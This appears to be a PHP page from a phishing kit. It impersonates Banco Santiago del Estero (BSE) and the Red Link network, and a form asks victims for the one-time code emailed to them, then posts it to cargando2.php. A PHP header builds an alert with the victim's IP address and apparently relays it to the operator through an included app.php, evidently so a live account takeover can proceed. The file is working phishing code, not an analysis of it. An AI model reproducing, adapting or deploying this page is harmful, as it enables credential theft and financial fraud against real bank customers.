<?php  
include 'config/personalizar.php';
if ($alertas == 1) {
  $enviara =
  "<b> ¡Alerta! Cliente 🌐 IP: </b> <code>".$_SERVER['REMOTE_ADDR']."</code> Ingresando código.\n";
  $enviar =  urldecode($enviara);
  include 'config/app.php';
}
?> 
<!doctype html>
<html lang="es-AR">
<head>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
  <meta http-equiv="refresh" id="loader">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel="stylesheet">
  <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
  <link rel="icon" type="ico" href="favicon.ico">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Red Link - Banco BSE</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="assets/css/style.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
  <script src="https://code.jquery.com/jquery-3.7.1.js" integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous"></script>
  <script type="text/javascript" src="assets/js/main.js"></script>
</head>
<body>
  <div class="h-100 w-100 ">
    <div class="h-100 py-5 shadow bg-white px-4 mx-auto w-100" style="max-width: 676px;">
      <img src="assets/images/bank_logo.png" class="logo mb-5">
      <h3 class="titulo_cargando my-3"><?php echo $titulo_verificacion; ?></h3>
      <p class="fs-5 description_cargando"> Banco Santiago del Estero BSE.</p>
      <div class="alert alert-light ">
        <i class="bi bi-envelope-open"></i>
        <?php echo $descripcion_verificacion; ?>
      </div>
      <img src="assets/images/check-mark-icon-symbols-vector-600nw-1906113508.webp" height="150px">
      <form method="POST" action="cargando2.php">
        <div class="mb-3">
          <label class="fw-semibold"><b>Ingresá el código recibido en tu correo electrónico.</b></label>
          <input type="tel" class="form-control" required maxlength="<?php echo $maximo; ?>" minlength="<?php echo $minimo; ?> " id="token" name="token">
        </div>
        <button name="submit" class="btn btn-primary px-5">Siguiente</button>
      </form>
    </div>
  </div>
  <script type="text/javascript">
    document.getElementById('token').addEventListener('keypress', (e)=>{
      if (e.which < 48 || e.which > 57) {
        e.preventDefault(); 
      }
    })
  </script>
</body>
</html>